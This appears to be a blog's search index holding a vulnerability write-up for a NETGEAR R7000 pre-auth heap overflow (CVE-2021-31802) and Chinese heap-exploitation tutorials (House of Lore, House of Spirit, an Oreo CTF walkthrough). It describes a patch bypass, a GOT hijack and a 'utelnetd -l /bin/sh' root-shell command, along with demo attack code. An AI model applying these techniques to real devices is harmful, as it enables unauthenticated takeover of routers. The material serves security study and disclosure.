<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CVE-2021-31802 NETGEAR R7000 httpd PreAuth RCE</title>
    <url>/2021/04/27/CVE-2021-31802%20Netgear%20R7000%20preAuth%20RCE/</url>
    <content><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>CVE-2021-31802 is my first CVE assignment, Thanks @d4rkn3ss for his brilliant work. I learn a lot from his work.  Thanks @SecuriTeam_SSD for their professional work, they help me to get the CVE assignment within a month, which I never got a response from MITRE by myself.</p>
<h2 id="Vulnerability-Summary"><a href="#Vulnerability-Summary" class="headerlink" title="Vulnerability Summary"></a>Vulnerability Summary</h2><p>This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of NETGEAR R7000 routers. Authentication is not required to exploit this vulnerability.<br>The vulnerability exists within the handling of http request, the issue results from the lack of proper validation of user-supplied data, which can result a heap overflow. An attacker can leverage this vulnerability to execute code with the root privilege.</p>
<h2 id="Affected-Systems"><a href="#Affected-Systems" class="headerlink" title="Affected Systems"></a>Affected Systems</h2><p>Netgear Nighthawk R7000 running firmware version 1.0.11.116 and before </p>
<h2 id="Vulnerability-Root-Cause-Analysis"><a href="#Vulnerability-Root-Cause-Analysis" class="headerlink" title="Vulnerability Root Cause Analysis"></a>Vulnerability Root Cause Analysis</h2><p>I bypass the patch for the ZDI-20-709 vulnerability, so I get this vulnerability. The patch for ZDI-20-709 cannot solve the root cause of the vulnerability. The httpd program allows user to upload a file with the url <code>/backup.cgi</code>. While the root cause of the vulnerability is that the program uses two variables to represent the length of the uploaded file.<br>One variable is related to the value of the <code>Content-length</code> in the http post request header, the other one is the length of the file content in the http post request body.</p>
<p>The vulnerability  exists in the <code>sub_16674</code>. Below picture is the heap overflow point:<br><img src="/images/netgear_r7000/2021-03-21-17-48-07.png"/><br>The decompiled code is like this:<br><img src="/images/netgear_r7000/2021-03-21-18-04-36.png"/>    </p>
<p>The program allocates memory for storing the file content by calling malloc，the return value is stored by <code>dword_1DE2F8</code>, the size is the value of <code>Content-Length</code> plus 600. The <code>Content-Length</code> value can be controlled by the attacker, thus if we provide a proper value, we can make the <code>malloc</code> to return any size of the heap chunk we want.</p>
<p>The <code>memcpy</code> function copies the http request payload from <code>s1</code>  to <code>dword_1DE2F8</code>, the copied buffer length is <code>v80 - v91</code> which is the length of the file content in the http post request body.</p>
<p>So this is the problem, the size of the heap-based buffer <code>dword_1DE2F8</code> can by controlled by the attacker with a small value, and the <code>v80-v91</code> can also by controlled with another larger value. Thus, it can cause a heap overflow.</p>
<h2 id="Exploit-Considerations"><a href="#Exploit-Considerations" class="headerlink" title="Exploit Considerations"></a>Exploit Considerations</h2><p>The patch for ZDI-20-709 is that it adds a check for one byte before <code>Content-Length</code>, it checks if it is a <code>&#39;\n&#39;</code>, I simply add a <code>&#39;\n&#39;</code> before the <code>Content-Length</code> in order to bypass the patch. Though the vulnerabilities are basically the same, but the exploit still needs a lot of efforts because the heap states are different between R6700 and R7000.</p>
<p>We may conduct a fastbin dup attack to the heap overflow vulnerability. But it is not easy to do this. Fastbin dup attack needs two continuous <code>malloc</code> function to get two return address from a same fastbin list, the first <code>malloc</code> returns the chunk whose <code>fd</code> pointer is overwritten by the heap overflow, the second <code>malloc</code> returns the address where we want to write data. </p>
<p>The bigest problem is that there should be no <code>free</code> procedure between these two <code>malloc</code> functions. But <code>dword_1DE2F8</code> is checked every time before malloc:<br><img src="/images/netgear_r7000/2021-03-21-21-11-46.png"/><br>If <code>dword_1DE2F8</code> is not a null pointer, it will be freed and set 0. Thus we should find another point of calling <code>malloc</code>.</p>
<p>Luckily, there is another <code>malloc</code> whose size can by controlled by us, it is in the function of  <code>sub_A5B68</code><br><img src="/images/netgear_r7000/2021-03-21-21-29-35.png"/><br>The function handles another file upload http request, we may use the <code>/genierestore.cgi</code> to trigger this function.</p>
<p>But there is another problem, both <code>/genierestore.cgi</code> and <code>/backup.cgi</code> requests can cause the <code>fopen</code> function gets called. The <code>fopen</code> function will call <code>malloc(0x60)</code> and <code>mallloc(0x1000)</code>. <code>malloc(0x1000)</code> will cause <code>__malloc_consolidate</code> function gets called which will destroy the fastbin, since the size is larger than the value of <code>max_fast</code>.</p>
<p>We need to find a way to change the <code>max_fast</code> value to a large value so that the <code>__malloc_consolidate</code> will not be triggered. According to the implemenation of uClibc <code>free</code> function:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> if ((unsigned long)(size) &lt;= (unsigned long)(av-&gt;max_fast)</span><br><span class="line"></span><br><span class="line">#if TRIM_FASTBINS</span><br><span class="line">	    /* If TRIM_FASTBINS set, don&#x27;t place chunks</span><br><span class="line">	       bordering top into fastbins */</span><br><span class="line">	    &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line">#endif</span><br><span class="line">       ) &#123;</span><br><span class="line"></span><br><span class="line">	set_fastchunks(av);</span><br><span class="line">	fb = &amp;(av-&gt;fastbins[fastbin_index(size)]); // &lt;-------when size is set 8 bytes, the fastbin_index(size) is -1</span><br><span class="line">	p-&gt;fd = *fb;</span><br><span class="line">	*fb = p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>When we free a chunk whose size is 0x8, <code>fastbin_index(size)</code> return -1, and <code>av-&gt;fastbins[fastbin_index(size)]</code> will cause an out-of-bounds access.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct malloc_state &#123;</span><br><span class="line">  /* The maximum chunk size to be eligible for fastbin */</span><br><span class="line">  size_t  max_fast;   /* low 2 bits used as flags */  </span><br><span class="line">  // 0</span><br><span class="line"></span><br><span class="line">  /* Fastbins */</span><br><span class="line">  // 4</span><br><span class="line">  mfastbinptr      fastbins[NFASTBINS];</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure>
<p>According to the struct of malloc_state, <code>fb = &amp;(av-&gt;fastbins[-1])</code> exactly points to <code>max_fast</code>, thus <code>*fb = p</code> will make the <code>max_fast</code> to a large value.<br>But in the normal situation, the chunk size cannot be 0x8 bytes, because it means that the user data is 0 byte. So we can first make use of the heap overflow vulnerability to overwrite the <code>PREV_INUSE</code> flag of a chunk so that it incorrectly indicates that the previous chunk is free. Due to the incorrect <code>PREV_INUSE</code> flag, we can get malloc() to return a chunk that overlaps an actual existing chunk. This lets us edit the size field in the existing chunk’s metadata, setting it to the invalid value of 8.  When this chunk is freed and placed on the fastbin, malloc_stats-&gt;max_fast is overwritten by a large value.Then the fopen will not lead to a <code>__malloc_consolidate</code>, so we can conduct a fastbin dup attack.<br>Once we make the <code>malloc</code> return a chosen address, we could overwrite the GOT entry of the <code>free</code> to the address of <code>system</code> PLT code. Finally we execute <code>utelnetd -l /bin/sh</code> to start the telnet service, then we get the root shell of R7000.</p>
<p>I use some techniques to make the exploit more steady. </p>
<ol>
<li><p>To make the malloc chunks are adjacent  so that the heap overflow will not corrupt other heap-based buffers, I send a very long payload to trigger closing the tcp connection in advance so that the <code>/backup.cgi</code> request will not calling <code>fopen</code> subsequently, and there will be no other malloc calling between two http requests. </p>
<img src="/images/netgear_r7000/2021-03-22-11-48-56.png"/>     </li>
<li><p>The httpd program’s heap state may be different when user login or logout the web management, to make the heap state consistent，I find that when I try to login the web management with wrong password for 3 times, the httpd program will redirect the user to a <code>Router Password Reset</code> page. I can make use of this feature to achieve a steady heap state.</p>
<img src="/images/netgear_r7000/2021-03-22-11-50-04.png"/>   </li>
</ol>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol>
<li><a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r7000-httpd-preauth-rce/">SSD Advisory – NETGEAR Nighthawk R7000 httpd PreAuth RCE</a></li>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-31802">CVE-2021-31802</a></li>
<li><a href="https://www.zerodayinitiative.com/blog/2020/6/24/zdi-20-709-heap-overflow-in-the-netgear-nighthawk-r6700-router">ZDI-20-709: HEAP OVERFLOW IN THE NETGEAR NIGHTHAWK R6700 ROUTER</a></li>
</ol>
]]></content>
      <categories>
        <category>IoT</category>
      </categories>
      <tags>
        <tag>IoT</tag>
      </tags>
  </entry>
  <entry>
    <title>堆利用系列九：House of Lore</title>
    <url>/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%9D%EF%BC%9AHouse-of-Lore/</url>
    <content><![CDATA[<h2 id="house-of-lore例程"><a href="#house-of-lore例程" class="headerlink" title="house of lore例程"></a>house of lore例程</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  puts(&quot;So let&apos;s cover House of Lore.&quot;);</span><br><span class="line">  puts(&quot;House of Lore focuses on attacking the small bin to allocate a chunk outside of the heap.&quot;);</span><br><span class="line">  puts(&quot;We will essentially create two fake small bin chunks, then overwrite the bk pointer of the small bin chunk to point to the first chunk.&quot;);</span><br><span class="line">  puts(&quot;Then just allocate chunks until we get a fake chunk.&quot;);</span><br><span class="line">  puts(&quot;It&apos;s sort of like a fast bin attack, however with more setup and restrictions.&quot;);</span><br><span class="line">  puts(&quot;Let&apos;s get started.\n\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  printf(&quot;We will start off by grooming the heap so we can do House of Lore.\n&quot;);</span><br><span class="line">  printf(&quot;For that we will need a chunk in the small bin that we can edit with some sort of bug.\n&quot;);</span><br><span class="line">  printf(&quot;For this we will allocate a small bin size chunk (by default on x64 it is greater than 0x80 and less than 0x400).\n\n&quot;);</span><br><span class="line"></span><br><span class="line">  unsigned long *ptr0;</span><br><span class="line">  ptr0 = malloc(0x200);</span><br><span class="line"></span><br><span class="line">  printf(&quot;Allocated chunk at:\t%p\n\n&quot;, ptr0);</span><br><span class="line"></span><br><span class="line">  printf(&quot;Next we will allocate another chunk, just to avoid consolidating our ptr0 chunk with the top chunk.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">  malloc(0x40);</span><br><span class="line"></span><br><span class="line">  printf(&quot;Next up we will insert our first heap chunk into the unsorted bin by freeing it.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">  free(ptr0);</span><br><span class="line"></span><br><span class="line">  printf(&quot;Now we will insert our unsorted bin chunk into the small bin by allocating a heap chunk big enough that it can&apos;t come out of the unsorted bin.\n&quot;);</span><br><span class="line"></span><br><span class="line">  malloc(0x500);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  printf(&quot;Now that we have a chunk in the small bin, we can move on to forging the fake chunks.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">  printf(&quot;The small bin is a doubly linked list, with a fwd and bk pointer.\n&quot;);</span><br><span class="line">  printf(&quot;The chunk that we allocate outside of the heap needs to have a fwd and bk pointer to chunks that their opposite pointers point back to them.\n&quot;);</span><br><span class="line">  printf(&quot;Due to checks made by malloc the fwd chunk&apos;s bk pointer needs to point to the chunk outside of the heap we will allocate with malloc, and vice versa.\n&quot;);</span><br><span class="line">  printf(&quot;So in total we will need three chunks, one of which is our small bin chunk, and the other two will be on the stack.\n&quot;);</span><br><span class="line">  printf(&quot;Our goal is to get malloc to allocate fake chunk 0 (it will be at an offset of 0x10 from the start).\n\n&quot;);</span><br><span class="line"></span><br><span class="line">  unsigned long fake0[4];</span><br><span class="line">  unsigned long fake1[4];</span><br><span class="line"></span><br><span class="line">  printf(&quot;Fake Chunk 0:\t%p\n&quot;, fake0);</span><br><span class="line">  printf(&quot;Fake Chunk 1:\t%p\n\n&quot;, fake1);</span><br><span class="line"></span><br><span class="line">  printf(&quot;Now we will write the pointers that will link our two fake chunks on the stack.\n&quot;);</span><br><span class="line">  printf(&quot;The bk pointer for fake chunk 0 will point to fake chunk 1.\n&quot;);</span><br><span class="line">  printf(&quot;The fwd pointer for fake chunk 1 will point to fake chunk 0.\n&quot;);</span><br><span class="line">  printf(&quot;This is because if a chunk is allocated from the small bin, the next chunk will be the bk chunk.\n&quot;);</span><br><span class="line">  printf(&quot;Also keep in mind, these pointers are to the start of the heap metadata.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">  fake0[3] = (unsigned long)fake1;</span><br><span class="line">  fake1[2] = (unsigned long)fake0;  //这个地方是为了绕过malloc(): smallbin double linked list corrupted</span><br><span class="line"></span><br><span class="line">  printf(&quot;Now we will write the two pointers that will link together fake chunk 0 and our small bin chunk.\n&quot;);</span><br><span class="line">  printf(&quot;This is also where our bug comes in to edit a freed small bin chunk.\n&quot;);</span><br><span class="line">  printf(&quot;We will use the bug to overwrite the bk pointer for the small bin chunk to point to point to fake chunk 0.\n&quot;);</span><br><span class="line">  printf(&quot;Then we will overwrite the fwd chunk of the fake chunk 0 to point to the small bin chunk.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">  ptr0[1]  = (unsigned long)fake0;</span><br><span class="line">  fake0[2] = (unsigned long)((unsigned long *)ptr0 - 2);</span><br><span class="line"></span><br><span class="line">  printf(&quot;small bin bk:\t\t0x%lx\n&quot;, ptr0[1]);</span><br><span class="line">  printf(&quot;fake chunk 0 fwd:\t0x%lx\n&quot;, fake0[2]);</span><br><span class="line">  printf(&quot;fake chunk 0 bk:\t0x%lx\n&quot;, fake0[3]);</span><br><span class="line">  printf(&quot;fake chunk 1 fwd:\t0x%lx\n\n&quot;, fake1[2]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  printf(&quot;Now that our setup is out of the way, let&apos;s have malloc allocate fake chunk 0.\n&quot;);</span><br><span class="line">  printf(&quot;We will allocate a heap chunk equal to the size of our small bin chunk.\n&quot;);</span><br><span class="line">  printf(&quot;This will allocate our small bin chunk, and move our fake chunk to the top of the small bin.\n&quot;);</span><br><span class="line">  printf(&quot;Then with another allocation we will get our fake chunk from malloc.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">  printf(&quot;Allocation 0:\t%p\n&quot;, malloc(0x200));   // b1</span><br><span class="line">  printf(&quot;Allocation 1:\t%p\n&quot;, malloc(0x200));   // b2</span><br><span class="line"></span><br><span class="line">  printf(&quot;\nJust like that, we executed a House of Lore attack!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过下图了解glibc到底改变了哪些指针<br><img src="/images/heap_exp/2021-06-15-11-33-57.png" alt></p>
<p>1.黑色箭头为0x210的chunk刚放到small bin的双向链表上的情况，此时small bin的fd bk指针都指向这个0x210chunk，该chunk的fd，bk指针也都指向small bin。  </p>
<p>2.红色箭头是使用一些漏洞对已经释放的chunk进行操作，让它的bk指针指向我们能够控制的fake0，对fake0和fake1的操作都是为了规避glibc对small bin双向链表的校验，假设victim这个chunk已经存放在了small bin上了，如果vicitim正好满足一个新的请求，glibc会去校验vicitim的后面一个chunk的fd指针，校验它是不是指向vicitim，如果不满足则直接报错崩溃。<br><code>fake0[2] = (unsigned long)((unsigned long *)ptr0 - 2);</code>这条是为了满足后面一次malloc的校验，<code>fake0[3] = (unsigned long)fake1;fake1[2] = (unsigned long)fake0;</code>这两条是为了满足后面第二次malloc的校验。</p>
<p>3.绿色的箭头是b1处malloc后的指针情况，当从small bin的链表上取chunk的时候，是从尾部取出chunk，然后修改两个指针。</p>
<p>4.紫色箭头是b2处的malloc后的指针情况，同样要修改两个指针。</p>
<p>思考一下应用条件，需要有能力修改一个已经释放到small bin上的chunk，需要有能力控制一块内存区域去构造两个虚假的chunk。</p>
]]></content>
      <categories>
        <category>堆利用</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
      </tags>
  </entry>
  <entry>
    <title>堆利用系列八：House of Spirit</title>
    <url>/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E5%85%AB%EF%BC%9A%C2%96House-of-Spirit/</url>
    <content><![CDATA[<h2 id="个人总结的打印libc地址的几种方法"><a href="#个人总结的打印libc地址的几种方法" class="headerlink" title="个人总结的打印libc地址的几种方法"></a>个人总结的打印libc地址的几种方法</h2><p><img src="/images/heap_exp/2021-06-10-20-36-20.png"></p>
<h2 id="思路尝试"><a href="#思路尝试" class="headerlink" title="思路尝试"></a>思路尝试</h2><ol>
<li>为了通过unsorted bin泄露libc，所以需要先构造一个unsroted binchunk，我用虚假free unsorted bin的方法，发现当一个chunk的大小是unsorted bin的时候，free它会报错，应该有一些检查，所以这条路走不通，除非能绕过这个检查<br><img src="/images/heap_exp//2021-06-11-10-20-40.png"><br>走到这个里面了，应该是我没有选择合适的size，导致那个mmap那个标志位被置1 了，我觉着这样太麻烦了，不用太在意了，还是跟着主要的解题思路走，我们已经知道了这道题是需要用free一个fastbin的，这个是不需要检测那个标志位的  </li>
</ol>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>house of spirit攻击是一种构造虚假的chunk(通常是fast chunk)，free这个chunk把它放到fastbin上，然后通过再次申请得到对这个chunk的控制权。构造虚假chunk的时候需要注意两个size，一个是这个虚假chunk的size还有一个是紧邻chunk的size。在特殊的场景下可以进行应用。</p>
<h2 id="house-of-spirit例程"><a href="#house-of-spirit例程" class="headerlink" title="house of spirit例程"></a>house of spirit例程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    puts(&quot;So we will be covering a House of Spirit Attack.&quot;);</span><br><span class="line">    puts(&quot;A House of Spirit Attack allows us to get malloc to return a fake chunk to a region we have some control over (such as the bss or stack).&quot;);</span><br><span class="line">    puts(&quot;In order for this attack to work and pass all of the malloc checks, we will need to make two fake chunks.&quot;);</span><br><span class="line">    puts(&quot;To setup the fake chunks, we will need to write fake size values for the chunks.&quot;);</span><br><span class="line">    puts(&quot;Also the first fake chunk is where we will want our chunk returned by malloc to be.&quot;);</span><br><span class="line">    puts(&quot;Let&#x27;s get started!\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    unsigned long array[20];</span><br><span class="line">    printf(&quot;So we start off by initializing our array on the stack.\n&quot;);</span><br><span class="line">    printf(&quot;Array Start: %p\n&quot;, array);</span><br><span class="line">    printf(&quot;Our goal will be to allocate a chunk at %p\n\n&quot;, &amp;array[2]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    printf(&quot;Now we need to write our two size values for the chunks.\n&quot;);</span><br><span class="line">    printf(&quot;There are three restrictions we have to meet.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;0.) Size of the chunks must be within the fast bin range.\n&quot;);</span><br><span class="line">    printf(&quot;1.) The size values must be placed where they should if they were an actual chunk.\n&quot;);</span><br><span class="line">    printf(&quot;2.) The size of the first heap chunk (the one that gets freed and reallocated) must be the same as the rounded up heap size of the malloc that we want to allocate our fake chunk.\n&quot;);</span><br><span class="line">    printf(&quot;That should be larger than the argument passed to malloc.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Also as a side note, the two sizes don&#x27;t have to be equal.\n&quot;);</span><br><span class="line">    printf(&quot;Check the code comments for how the fake heap chunks are structured.\n&quot;);</span><br><span class="line">    printf(&quot;With that, let&#x27;s write our two size values.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    this will be the structure of our two fake chunks:</span><br><span class="line">    assuming that you compiled it for x64</span><br><span class="line"></span><br><span class="line">    +-------+---------------------+------+</span><br><span class="line">    | 0x00: | Chunk # 0 prev size | 0x00 |</span><br><span class="line">    +-------+---------------------+------+</span><br><span class="line">    | 0x08: | Chunk # 0 size      | 0x60 |</span><br><span class="line">    +-------+---------------------+------+</span><br><span class="line">    | 0x10: | Chunk # 0 content   | 0x00 |</span><br><span class="line">    +-------+---------------------+------+</span><br><span class="line">    | 0x60: | Chunk # 1 prev size | 0x00 |</span><br><span class="line">    +-------+---------------------+------+</span><br><span class="line">    | 0x68: | Chunk # 1 size      | 0x40 |</span><br><span class="line">    +-------+---------------------+------+</span><br><span class="line">    | 0x70: | Chunk # 1 content   | 0x00 |</span><br><span class="line">    +-------+---------------------+------+</span><br><span class="line"></span><br><span class="line">    for what we are doing the prev size values don&#x27;t matter too much</span><br><span class="line">    the important thing is the size values of the heap headers for our fake chunks</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    array[1] = 0x60;</span><br><span class="line">    array[13] = 0x40;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now that we setup our fake chunks set up, we will now get a pointer to our first fake chunk.\n&quot;);</span><br><span class="line">    printf(&quot;This will be the ptr that we get malloc to return for this attack\n&quot;);</span><br><span class="line"></span><br><span class="line">    unsigned long *ptr;</span><br><span class="line">    ptr = &amp;(array[2]);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Address: %p\n\n&quot;, ptr);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now we will free the pointer to place it into the fast bin.\n&quot;);</span><br><span class="line"></span><br><span class="line">    free(ptr);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now we can just allocate a chunk that it&#x27;s rounded up malloc size will be equal to that of our fake chunk (0x60), and we should get malloc to return a pointer to array[1].\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    unsigned long *target;</span><br><span class="line">    target = malloc(0x50);</span><br><span class="line"></span><br><span class="line">    printf(&quot;returned pointer: %p\n&quot;, target);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Hack-lu-2014-Oreo"><a href="#Hack-lu-2014-Oreo" class="headerlink" title="Hack.lu 2014 Oreo"></a>Hack.lu 2014 Oreo</h2><p><a href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/39-house_of_spirit/hacklu14_oreo">文件链接</a>  </p>
<h3 id="构建调试环境"><a href="#构建调试环境" class="headerlink" title="构建调试环境"></a>构建调试环境</h3><p>首先看一下二进制和libc的情况. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file ./oreo</span><br><span class="line">ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.26, BuildID[sha1]=f591eececd05c63140b9d658578aea6c24450f8b, stripped</span><br></pre></td></tr></table></figure>
<p>可以发现这是一个32位的x86的二进制，而且这是一个可执行文件，就是加载地址是在固定的位置0x08048000。</p>
<p>链接给了一个libc.2.23的文件，但是我无法直接用pwntools中的process运行，均提示segment fault，尝试了几种方法最终通过运行ld文件，把二进制作为参数传给ld，然后指定LD_PRELOAD为libc.2.23的方法构建了调试环境。本文的调试主机环境为ubuntu18.04</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">target = process(argv=[&#x27;./ld-2.23.so&#x27;,&#x27;./oreo&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span><br></pre></td></tr></table></figure>
<p>ld-2.23.so和libc.so.6是从glibc-all-in-one中下载的2.23版本的glibc文件，具体方法可参考我的前文。<br>至于为什么不能通过直接运行oreo二进制进行调试，我不太清楚原因，貌似是当oreo是可执行文件的时候，ld文件运行的时候有些问题，想通过调试确定一下问题，但是ld的逻辑太复杂，所以作罢，有更优雅的解决方案同学可以提示一下。</p>
<h3 id="逆向审计"><a href="#逆向审计" class="headerlink" title="逆向审计"></a>逆向审计</h3><p>通过逆向观察oreo二进制反编译代码，二进制有几个功能</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> case 1:</span><br><span class="line">    add_rifle();</span><br><span class="line">    break;</span><br><span class="line">  case 2:</span><br><span class="line">    show_added_rifles();</span><br><span class="line">    break;</span><br><span class="line">  case 3:</span><br><span class="line">    order_selected_rifles();</span><br><span class="line">    break;</span><br><span class="line">  case 4:</span><br><span class="line">    leave_message_with_order();</span><br><span class="line">    break;</span><br><span class="line">  case 5:</span><br><span class="line">    show_current_stats();</span><br><span class="line">    break;</span><br><span class="line">  case 6:</span><br><span class="line">    return __readgsdword(0x14u) ^ v1;</span><br><span class="line">  default:</span><br><span class="line">    continue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>add_rifle就是相当于malloc创建一个chunk，show_added_rifles就是打印内存内容，而order_selected_rifles这个函数的功能是对所有创建的chunk进行free，还有一个函数是读取数据到一个bss段的全局变量<br>漏洞点也比较明显，在add_rifle中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mem_store_rifles = (char *)malloc(0x38u);  //创建0x38 + 8的chunk</span><br><span class="line"> if ( mem_store_rifles )</span><br><span class="line"> &#123;</span><br><span class="line">   *((_DWORD *)mem_store_rifles + 13) = v1;     // 把上一个chunk写入到新chunk中</span><br><span class="line">   printf(&quot;Rifle name: &quot;);</span><br><span class="line">   fgets(mem_store_rifles + 25, 56, stdin);   //写入的时候是从偏移25的地方再写入56个字节，堆溢出</span><br><span class="line">   sub_80485EC(mem_store_rifles + 25);</span><br><span class="line">   printf(&quot;Rifle description: &quot;);</span><br><span class="line">   fgets(mem_store_rifles, 56, stdin);</span><br><span class="line">   sub_80485EC(mem_store_rifles);</span><br><span class="line">   ++new_rifle_num;</span><br></pre></td></tr></table></figure>
<p>创建的chunk大小是0x40，但是写入的时候是从偏移25的位置再写入56个字节，这会造成堆溢出。<br>在这个函数中还有一个把旧的chunk指针写入到当前这个chunk中保存的逻辑，这个逻辑比较特殊应该会在后面的利用中用到。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>我本人尝试了几种思路一开始，但是都遇到了一些问题，首先这个创建chunk的大小都是固定的不是可控的，而且释放的时候也是根据链表进行全部释放，所以也不能随意的指定释放的顺序。这就给利用带来了一些困难。  </p>
<h4 id="尝试fastbin攻击"><a href="#尝试fastbin攻击" class="headerlink" title="尝试fastbin攻击"></a>尝试fastbin攻击</h4><p>通过溢出我们是可以通过fastbin 攻击把fastbin中的chunk的fd指针给修改到我们想要的地方，但是由于再次malloc的时候会验证chunk的size是否符合对应的fastbin size，我并没有在二进制中看到可以满足这个size的内存，所以这种方式比较难实现fastbin攻击，而且由于最终要借用system这种函数去实现拿shell，由于system函数没有在二进制中调用，所以最终还是要知道libc的加载地址才行。</p>
<h4 id="尝试泄露libc地址"><a href="#尝试泄露libc地址" class="headerlink" title="尝试泄露libc地址"></a>尝试泄露libc地址</h4><p>泄露libc地址的方式可以通过打印got表或者打印unsorted bin中的chunk的fd指针来实现，第一种打印got表需要劫持函数并且要求函数的参数是用户可控的，由于我们并不能实现对任意地址的写入功能，实现劫持函数就比较难实现，所以这种方法实现libc地址的难度较大。<br>尝试通过unsroted bin实现libc泄露也很困难，因为这个大小是0x40的chunk固定分配的，而0x40还是在fastbin的大小范围内，所以要想得到一个unsorted bin上的chunk就不容易，我想的是通过修改储存在当前chunk中的旧chunk的指针，让这个旧chunj指针指向一个虚假的地址，而且让-4偏移的内存作为假的size字段，但是我还是搜遍了二进制没有发现到很合适的size，能够不触发合并，而且没有让mmap标志位置1的内存，所以这种方式我也失败了。</p>
<p>数据结构图<br><img src="/images/heap_exp//2021-06-15-09-11-00.png"></p>
<h4 id="结合二进制本身的业务逻辑"><a href="#结合二进制本身的业务逻辑" class="headerlink" title="结合二进制本身的业务逻辑"></a>结合二进制本身的业务逻辑</h4><p>泄露libc地址的通用方法在这个二进制中非常困难，所以我们不得不考虑结合二进制本身的业务逻辑去做这个libc的地址泄露。这个二进制比较特殊的一个点是它把新旧chunk用链表的形式给串起来了，所以我们要充分利用这链表指针，因为这个指针我们是可以控制的，所以我们直接可以让这个链表指针指向我们的GOT表，通过打印逻辑把GOT表中的内容给打印出来。</p>
<p>我们可以让这个链表指针指向puts的got表地址0x0804A248，我们只需要控制分配的内容，覆盖这个指针。我们通过逆向add_rifle的逻辑可以发现，name这个字段是从偏移25的地方开始写入，然后可以写入56个字节，而我们的链表指针的偏移是52,所以我们的name可以写入27个字节之后，再写入的内容就是指针内容。</p>
<p>拿到了libc的地址后，我们就可以通过fastbin attack去修改malloc_hook和free_hook的值，但是同样的由于这两个地址附近都是没有可用的size的，got表附近也是没有可用的size，所以这题貌似通过简单的fastbin attack是行不通的，只能思考别的办法。</p>
<p>我们目标是修改GOT表，或者是函数指针的的值，但是目前我们没有这个条件，现在又卡到了我们，只能再去研究二进制，我们可以注意到还有一个leave message的函数我们是没有用到的，而这个函数是往一个指针指向的内存中写入数据，这个数据是我们可控的。而且发现存储这个指针的内存前面4个字节的内存内容也是可控的，他是表示创建的rifle的数目。所以思路出来了，如果我们能够修改这个指针，让他指向got表，就可以往got表中写入值了。</p>
<p>我们可以利用house of spirit实现修改这个指针。首先让这个rifle数目满足我们的0x40，然后free这个存储指针的地址，这样我们就在fastbin中添加了这个chunk，然后再malloc就可以得到对这个存储指针的地址的控制权，然后我们修改这个指针让他指向got表。</p>
